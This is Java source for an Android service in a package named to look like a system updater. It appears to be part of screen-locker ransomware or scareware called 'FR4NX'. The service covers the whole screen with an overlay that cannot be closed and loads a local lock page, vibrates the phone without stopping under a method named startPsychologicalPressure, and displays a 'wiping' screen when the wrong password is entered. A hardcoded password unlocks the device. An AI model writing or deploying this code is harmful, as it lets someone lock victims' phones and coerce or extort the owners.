package com.system.updatex;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.view.Gravity;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class OverlayService extends Service {
    private static final String CHANNEL_ID = "fr4nx_kiosk";
    private static final int NOTIFICATION_ID = 9001;

    private WindowManager windowManager;
    private WindowManager.LayoutParams windowParams;
    private WebView lockWebView;
    private boolean overlayAttached = false;
    private Vibrator vibrator;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "FR4NX", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(channel);
            startForeground(NOTIFICATION_ID, new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("FR4NX")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .build());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!Settings.canDrawOverlays(this)) {
            stopSelf();
            return START_NOT_STICKY;
        }
        
        boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE).getBoolean("is_unlocked", false);
        if (isUnlocked) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if (!overlayAttached) {
            createOverlay();
            startPsychologicalPressure();
        }
        return START_STICKY;
    }

    private void createOverlay() {
        if (overlayAttached) return;
        
        windowParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
        );
        windowParams.gravity = Gravity.TOP | Gravity.START;
        windowParams.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        lockWebView = new WebView(this);
        WebSettings webSettings = lockWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        
        // THIS FIXES THE NETWORK ERROR
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setAllowContentAccess(true);
        
        lockWebView.setBackgroundColor(0xFF050000);
        lockWebView.setWebViewClient(new WebViewClient());
        
        lockWebView.addJavascriptInterface(new LockWebInterface(this), "Android");
        lockWebView.loadUrl("file:///android_asset/lock_screen.html");

        try {
            windowManager.addView(lockWebView, windowParams);
            overlayAttached = true;
        } catch (Exception e) {
            stopSelf();
        }
    }

    private void startPsychologicalPressure() {
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (vibrator != null && vibrator.hasVibrator()) {
            long[] pattern = {0, 1000, 1000};
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
            } else {
                vibrator.vibrate(pattern, 0);
            }
        }
    }

    // Called from HTML Javascript
    public void authenticateUser(String pass) {
        if ("FR4NX".equals(pass)) {
            lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
        } else {
            lockWebView.post(() -> lockWebView.evaluateJavascript("showWiping();", null));
        }
    }

    // Called from HTML Javascript after the 10s progress bar
    public void unlockOverlay() {
        if (vibrator != null) vibrator.cancel();
        
        // SAVE THE FLAG SO ACCESSIBILITY SERVICE STANDS DOWN
        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).apply();

        if (overlayAttached && lockWebView != null) {
            try {
                windowManager.removeView(lockWebView);
                lockWebView.destroy();
            } catch (Exception ignored) {}
            overlayAttached = false;
        }
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        if (vibrator != null) vibrator.cancel();
        if (overlayAttached && lockWebView != null) {
            try { windowManager.removeView(lockWebView); } catch (Exception ignored) {}
        }
        stopForeground(true);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
